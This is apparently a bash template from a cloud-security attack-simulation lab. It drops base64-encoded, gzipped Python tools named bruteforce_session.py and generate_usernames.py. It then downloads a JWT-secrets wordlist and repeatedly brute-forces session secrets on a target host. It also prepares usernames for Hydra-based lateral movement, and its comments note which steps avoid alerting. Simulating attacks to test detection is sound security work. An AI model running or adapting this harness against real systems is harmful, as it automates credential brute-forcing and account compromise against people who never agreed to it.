#!/usr/bin/env bash

# TEMPLATE INPUTS
# script_name: name of the script, which will be used for the log file (e.g. /tmp/<script_name>.log)
# log_rotation_count: total number of log files to keep
# apt_pre_tasks: shell commands to execute before install
# apt_packages: a list of apt packages to install
# apt_post_tasks: shell commands to execute after install
# yum_pre_tasks:  shell commands to execute before install
# yum_packages: a list of yum packages to install
# yum_post_tasks: shell commands to execute after install
# script_delay_secs: total number of seconds to wait before starting the next stage
# next_stage_payload: shell commands to execute after delay

export SCRIPTNAME="tag"
export LOCKFILE="/tmp/lacework_deploy_$SCRIPTNAME.lock"
export LOCKLOG=/tmp/lock_$SCRIPTNAME.log
export MAXLOG=2
truncate -s0 $LOCKLOG
# Initial lock is debug for lock handler
export LOGFILE=$LOCKLOG
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}

# in some cases we'll have multiple executions as the same time - try to randomize start time
RAND_WAIT=$(($RANDOM%(300-30+1)+30))
log "waiting $RAND_WAIT seconds before starting..."
sleep $RAND_WAIT

if command -v yum && ! command -v ps; then
    RETRY="--setopt=retries=10"
    yum update $RETRY -y && yum $RETRY install -y procps
fi

CURRENT_PROCESS=$(echo $$)
PROCESSES=$(pgrep -f "\| tee /tmp/payload_$SCRIPTNAME \| base64 -d \| gunzip")
PROCESS_NAMES=$(echo -n $PROCESSES | xargs --no-run-if-empty ps fp)
COUNT=$(pgrep -f "\| tee /tmp/payload_$SCRIPTNAME \| base64 -d \| gunzip" | wc -l)
# logs initially appended to current log - no log rotate before checking lock file
log "Lock pids: $PROCESSES"
log "Lock process names: $PROCESS_NAMES"
log "Lock process count: $COUNT"
if [ -e "$LOCKFILE" ] && [ $COUNT -gt 1 ]; then
    log "LOCKCHECK: Another instance of the script is already running. Exiting..."
    exit 1
elif [ -e "$LOCKFILE" ] && [ $COUNT -eq 1 ]; then
    log "LOCKCHECK: Lock file with no running process found - updating lock file time and starting process"
    touch "$LOCKFILE"
else
    log "LOCKCHECK: No lock file and no running process found - creating lock file"
    mkdir -p "$(dirname "$LOCKFILE")" && touch "$LOCKFILE"
fi
function cleanup {
    rm -f "$LOCKFILE"
}
trap cleanup EXIT INT TERM
trap cleanup SIGINT

# Update lofile after lock check
export LOGFILE=/tmp/lacework_deploy_$SCRIPTNAME.log

# Log rotate
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

# Determine Package Manager
if command -v apt-get &>/dev/null; then
    export PACKAGE_MANAGER="apt-get"
    PACKAGES=""
    RETRY="-o Acquire::Retries=10"
elif command -v yum &>/dev/null; then
    export PACKAGE_MANAGER="yum"
    PACKAGES=""
    RETRY="--setopt=retries=10"
else
    log "Neither apt-get nor yum found. Exiting..."
    exit 1
fi

# Wait for Package Manager
check_package_manager() {
    if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
        # Return 0 (false) if a package manager process is found, indicating it's busy
        ! pgrep -f "apt-get (install|update|remove|upgrade)" && \
        ! pgrep -f "aptitude (install|update|remove|upgrade)" && \
        ! pgrep -f "dpkg (install|configure)"
    else
        # Similar logic for yum/rpm
        ! pgrep -f "yum (install|update|remove|upgrade)" && \
        ! pgrep -f "rpm (install|update|remove|upgrade)"
    fi
}

check_payload_update() {
    local payload_path=$1  # First argument passed to the function
    local start_hash=$2
    local check_hash=$(sha256sum --text "$payload_path" | awk '{ print $1 }')
    log "comparing start payload hash: $start_hash to current payload hash: $check_hash"
    if [ "$check_hash" != "$start_hash" ]; then
        log "payload update detected..."
        return 1  # Return 1 if payload update is detected
    else
        log "no payload update..."
        return 0  # Return 0 if no update is detected
    fi
}

# if package manager is busy wait some random amount of time - again to create more randomness
while ! check_package_manager; do
    RAND_WAIT=$(($RANDOM%(300-30+1)+30))
    log "Waiting for $PACKAGE_MANAGER to be available - sleeping $RAND_WAIT"
    sleep $RAND_WAIT
done

# export functions for child script usage
export -f log check_payload_update

# Conditional Commands based on package manager
if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
log "Starting apt pre-task";

log "Done apt pre-task";
elif [ "$PACKAGE_MANAGER" == "yum" ]; then
log "Starting yum pre-task";

log "Done yum pre-task";
fi
if [ "" != "$PACKAGES" ]; then
    while true; do
        /bin/bash -c "$PACKAGE_MANAGER update && $PACKAGE_MANAGER install -y $PACKAGES" >> $LOGFILE 2>&1
        if [ $? -ne 0 ]; then
            log "Failed to install some_package using $PACKAGE_MANAGER - retry required"
            while ! check_package_manager; do
                RAND_WAIT=$(($RANDOM%(300-30+1)+30))
                log "Waiting for $PACKAGE_MANAGER to be available - sleeping $RAND_WAIT"
                sleep $RAND_WAIT
            done
        else
            break
        fi
    done
fi
if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
log "Starting apt post-task";

log "Done apt post-task";
elif [ "$PACKAGE_MANAGER" == "yum" ]; then
log "Starting yum post-task";

log "Done yum post-task";
fi

MAX_WAIT=attack_delay
CHECK_INTERVAL=60
log "starting delay: $MAX_WAIT seconds"
SECONDS_WAITED=0
while true; do 
    SECONDS_WAITED=$((SECONDS_WAITED + CHECK_INTERVAL))
    if [ $SECONDS_WAITED -ge $MAX_WAIT ]; then
        log "completed wait $((MAX_WAIT / 60)) minutes." && break
    fi
    sleep $CHECK_INTERVAL;
done
log "delay complete"

log "starting next stage after $SECONDS_WAITED seconds..."
log "starting execution of next stage payload..."
log "cleaning app directory"
rm -rf /authapp_attack
mkdir -p /authapp_attack
cd /authapp_attack
echo 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 | base64 -d | gunzip > bruteforce_session.py
echo H4sIAAAAAAAA/5RVwW6cMBC98xXT5ACoQBL1thKHqIdeeogq9ZRGlhPMrlesbdlDVulq/72yAWPDrpTmkMV+b+a9GePh9stdb/TdKxd3TLyD+sCdFN+ShB+U1AhUbxXVhq03Wi0PoCjuOv4KI/hEcZckDtdQe271qLf9gQl8ckiWAAA0zLxprpBLUadbJpimyEBJY/hrx6A3TAt6YAacUMu1QaCigY4aBIek+ShV0aYhdNTI0rJ07LSwGlin0wo/FKsN6sLpL/92rFMj16W/nt068MnHxWdye+fXU8seVT8n98vPpLdnAShhCALNTN+hbVJC9dZADaOm+7GqJsuTJGlYC1P7ie965hpB7HPhWu4e843Tv4Wf8sj0GzWsgO9UcaQd/8sKdz6/lRogeGfacCkMyHY4MBfsnsg71ZwKtLaefU2BaNVZhSwPxKetvLgY8OZ9RFFX2L11Gacfty4HhMRQ6f/MXAp9cf+54MhpZ/sxp3m+f5mKhq9zlmA7Gc/jx3R/pgO0NxOZFkPPp0XU7fR0fz49nNPCJtjLnWgki0ASoWQJVxFcLeEygsslPEPB9hSxID/fvwROL4CBlaUPCweFLKuwcOB0ZfP0YBlBjyK3vo5GslUpJETJCq5CuFrBZQiXS9h1xBMuoUH6VfKhJx5feRua4vGV+nno21z6su4IJftl3RFc7Zd1R3C5H2/J+KY/KtV9zC80Sj+85k+Go84fkBoMwyx3u63UwwUbbiVwsRhIG+/GUkcdS5skN9EI9ip2lGcjp2qlPlDMAqHcX9VfDHstgIKRGlkDHTdoyzhQLpByAVI3TDuyHqgDMfNSdmrzFogbBoRAXUNKiI0nJN2sir8w3O3wr0Z37tlZdJFHjjuQiomBNHxMCkiPaQ7UQBv3x48bLmbNuENKc4HefB5hbXXUHFnW3pwmwvmPuMmTfwAAAP//AQAA//9z8YHIlggAAA== | base64 -d | gunzip > generate_usernames.py 
echo H4sIAAAAAAAA/wpKLSxNLS4ptrU10jM21DPgSstJLM6OL80rzkzPs7U11DPSMwAAAAD//wEAAP//cZdxNyQAAAA= | base64 -d | gunzip > requirements.txt
log "installing required python3.9..."
apt-get install -y python3.9 >> $LOGFILE 2>&1
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
python3.9 get-pip.py >> $LOGFILE 2>&1
log "wait before using module..."
sleep 5
python3.9 -m pip install -U pip "packaging>=24" "ordered-set>=3.1.1" "more_itertools>=8.8" "jaraco.text>=3.7" "importlib_resources>=5.10.2" "importlib_metadata>=6" "tomli>=2.0.1" "wheel>=0.43.0" "platformdirs>=2.6.2" setuptools wheel setuptools_rust netifaces>=0.11.0 netifaces-plus>=0.12.4 jinja2 jc >> $LOGFILE 2>&1
log "installing exploit requirements..."
python3.9 -m pip install --ignore-installed -r requirements.txt >> $LOGFILE 2>&1
    
curl -LJ https://raw.githubusercontent.com/danielmiessler/SecLists/89e486bd4e1bcd1bd3fc565216097a8d389f3983/Passwords/scraped-JWT-secrets.txt -o /tmp/scraped-JWT-secrets.txt

START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
while true; do
    log "starting script..."
    log "checking target: target_ip:target_port"
    while ! nc -z -w 5 -vv target_ip target_port > /dev/null; do
        log "failed check - waiting for target: target_ip:target_port";
        sleep 30;
        if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
            log "payload update detected - exiting loop and forcing payload download"
            rm -f /tmp/payload_$SCRIPTNAME
            break 2
        fi
    done;
    log "target available - sending payload";
    sleep 5;
        
    # brute force the session password
    python3.9 bruteforce_session.py --host=target_ip --port=target_port --password-list=/tmp/scraped-JWT-secrets.txt --output-password-list=/tmp/hydra-passwords.txt 2>&1 | tee -a $LOGFILE

    # prep for second stage below providing usernames and password for lateral movement        

    # result is hydra-password list but we need a user list - since external brute force isn't alerted on let's skip
    # python3.9 generate_usernames.py --first=compromised_user_first_name --last=compromised_user_last_name --output=/tmp/hydra-users.txt
    USER_NAME="$(echo "compromised_user_first_name" | tr '[:upper:]' '[:lower:]' | cut -c1)$(echo "compromised_user_last_name"| tr '[:upper:]' '[:lower:]')"
    log "username: $USER_NAME"
    echo $USER_NAME > /tmp/hydra-users.txt

    log 'waiting 30 minutes...';
    sleep 1800
    if ! check_payload_update /tmp/payload_$SCRIPTNAME $START_HASH; then
        log "payload update detected - exiting loop and forcing payload download"
        rm -f /tmp/payload_$SCRIPTNAME
        break
    else
        log "restarting loop..."
        log "waiting attack_delay seconds...";
        sleep attack_delay
    fi
done
log "Done."

log "done next stage payload execution."

log "Done"